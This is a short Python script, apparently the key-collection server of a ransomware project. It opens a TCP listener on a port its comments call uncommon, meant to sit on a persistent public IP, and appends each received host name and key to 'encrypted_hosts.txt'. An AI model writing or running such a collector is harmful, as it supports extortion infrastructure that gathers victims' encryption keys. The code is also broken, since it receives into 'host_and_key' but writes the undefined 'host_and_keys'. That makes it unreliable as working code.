import socket

IP_ADDRESS = '192.168.1.85'  # u should open a persistent server with public ip
PORT = 6745 # Use a non common port to comiunicate!

print('Creating Socket')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(('0.0.0.0', PORT))
    print('Connections?')
    s.listen(1)
    conn, addr = s.accept()
    print(f'{addr} Connected')

    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_keys + '\n')
            break
        print("Connection Success and Closed")  
